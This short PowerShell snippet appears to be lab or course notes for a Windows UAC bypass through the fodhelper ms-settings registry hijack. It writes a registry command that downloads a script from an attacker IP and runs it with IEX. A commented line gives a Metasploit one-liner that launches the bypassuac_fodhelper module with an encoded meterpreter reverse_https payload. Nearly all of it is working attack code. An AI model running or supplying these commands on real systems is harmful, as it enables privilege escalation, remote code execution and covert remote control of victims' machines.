New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

#Make sure session 1 is correct here. along with architecture stuff. i.e. the encoding method.
#msfconsole -q -x "use exploit/windows/local/bypassuac_fodhelper; set session 1; set payload windows/x64/meterpreter/reverse_https; set EnableStageEncoding true; set StageEncoder x64/zutto_dekiru; set lhost tun0; set lport 4444; run;"